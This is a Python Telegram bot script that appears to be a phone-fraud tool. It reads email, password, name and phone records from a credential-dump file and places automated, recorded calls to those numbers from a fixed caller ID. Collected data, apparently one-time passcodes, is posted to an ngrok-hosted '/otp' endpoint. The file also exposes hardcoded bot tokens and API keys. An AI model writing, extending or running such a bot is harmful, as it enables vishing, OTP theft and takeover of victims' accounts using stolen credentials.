import re

import requests
import logging
from aiogram import Bot, Dispatcher, types
import JokerAPI
import aiohttp
import json
# Joker Initiatior

# Set API Key
API_TOKEN = '6409753184:AAGdJ3GBWBM2TkeFaJ-8nLB4qsjQakVy4AQ'
apivalley_userid = '9acee9fa-00a3-40be-9916-ee6b27d313bd'
apivalley_key='edLOD2IwIAjC3FC9L1eZ9pcClE95usGBo4xrwOcDHavTHe8DtKOv080wMZ39xtCk'

# Initialize bot and dispatcher
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

@dp.message_handler(commands=['start', 'help'])
async def send_welcome(message: types.Message):
    await message.reply("Hi!\nI'm a bot to make calls via Joker API!\nUse /call to make a call.")

@dp.message_handler(commands=['call'])
async def make_call(message: types.Message):
    chat_id = message.chat.id
    msg = message.text.split()

    if len(msg) == 3:
        number = str(msg[1])
        name = msg[2]

        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',

        }

        data = {
            'to': '+'+number,
            'from': '+18882226662',
            'callback_url': 'https://settled-perch-nationally.ngrok-free.app/makecall/'+str(chat_id)+"/"+name,
            'type': 'api',
            'amd_enabled': True,  
            'record_enabled': True  
        }

        response = requests.post(
            'https://api.apivalley.su/api/v1/calls/create-call',
            headers=headers,
            json=data,  
            auth=(apivalley_userid, apivalley_key),
        )
        if response.status_code == 200:
            response_data = response.json()  # Parse JSON response content
            if 'data' in response_data and 'call_id' in response_data['data']:
                print(response_data['data']['call_id'])
            else:
                print("The 'data' or 'call_id' key is not in the JSON response.")
        else:
            print("Failed to create call. Status code:", response.status_code)
            print("Response content:", response.text)
    await message.reply(name)

    @dp.callback_query_handler(lambda c: c.data)
    async def process_callback(callback_query: types.CallbackQuery):
        # Here you can make a POST request to your server
        server_url = "https://settled-perch-nationally.ngrok-free.app/otp"
        data = json.loads(callback_query.data)

        async with aiohttp.ClientSession() as session:
            async with session.post(server_url, json=data) as response:
                response_data = await response.text()

        # You can also send an answer to the callback query
        await bot.answer_callback_query(callback_query.id)



@dp.message_handler(commands=['data'])
async def print_data_command(message: types.Message):
    msg = message.text.split()
    id = int(msg[1])
    extracted_data = get_data(id)  # Replace 'id' with the actual ID value
    
    # Create an inline keyboard with a button to call the data
    inline_keyboard = types.InlineKeyboardMarkup()
    inline_keyboard.add(types.InlineKeyboardButton(text="Call Data", callback_data=f"call_data:{id}"))
    
    # Send the extracted data with the inline keyboard to the user
    await message.reply(str(extracted_data), reply_markup=inline_keyboard)
@dp.callback_query_handler(lambda c: c.data.startswith("call_data:"))
async def process_call_data(callback_query: types.CallbackQuery):
    chat_id = callback_query.from_user.id
    data = callback_query.data.split(":")
    id = int(data[1])
    extracted_data = get_data(id, oh="oh")
    number = extracted_data['phone_number']
    name = extracted_data['first_name']
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',

    }

    data = {
        'to': number,
        'from': '+18882226662',
        'callback_url': 'https://settled-perch-nationally.ngrok-free.app/makecall/'+str(chat_id)+"/"+name,
        'type': 'api',
        'amd_enabled': True,  
        'record_enabled': True  
    }

    response = requests.post(
        'https://api.apivalley.su/api/v1/calls/create-call',
        headers=headers,
        json=data,  
        auth=(apivalley_userid, apivalley_key),
    )
    if response.status_code == 200:
        response_data = response.json()  # Parse JSON response content
        if 'data' in response_data and 'call_id' in response_data['data']:
            print(response_data['data']['call_id'])
        else:
            print("The 'data' or 'call_id' key is not in the JSON response.")
    else:
        print("Failed to create call. Status code:", response.status_code)
        print("Response content:", response.text)
    # Send the extracted data as a message to the user
    await bot.send_message(callback_query.from_user.id, str(extracted_data))
    
    # Answer the callback query
    await bot.answer_callback_query(callback_query.id)

@dp.callback_query_handler(lambda c: c.data)
async def process_callback(callback_query: types.CallbackQuery):
    # Here you can make a POST request to your server
    server_url = "https://settled-perch-nationally.ngrok-free.app/otp"
    data = json.loads(callback_query.data)

    async with aiohttp.ClientSession() as session:
        async with session.post(server_url, json=data) as response:
            response_data = await response.text()

    # You can also send an answer to the callback query
    await bot.answer_callback_query(callback_query.id)
def get_data(id, oh=None):
    email_pattern = re.compile(r'([\w\.-]+@[\w\.-]+)')
    password_pattern = re.compile(r':([^|]+)')
    full_name_pattern = re.compile(r'Full Name = ([^|]+)')
    phone_number_pattern = re.compile(r'Phone Number = (\+\d+)')

    # Dictionary to store the extracted information
    extracted_data = []
    # Open the file and read line by line
    with open('data.txt', 'r') as file:
        for line in file:
            email_match = email_pattern.search(line)
            password_match = password_pattern.search(line)
            full_name_match = full_name_pattern.search(line)
            phone_number_match = phone_number_pattern.search(line)

            if email_match and password_match and full_name_match and phone_number_match:
                # Extract the first name from the full name
                first_name = full_name_match.group(1).split()[0]
                
                # Append the extracted data to the list
                extracted_data.append({
                    'email': email_match.group(1),
                    'password': password_match.group(1).strip(),
                    'first_name': first_name,
                    'phone_number': phone_number_match.group(1)
                })

    # Print the extracted data
    if oh == "oh":
        return extracted_data[id]
    else:
        data = extracted_data[id]
        return f"Email: {data['email']}, Password: {data['password']}, First Name: {data['first_name']}, Phone Number: {data['phone_number']}"
if __name__ == '__main__':
    from aiogram import executor

    # setup logging
    logging.basicConfig(level=logging.INFO)

    executor.start_polling(dp, skip_updates=True)
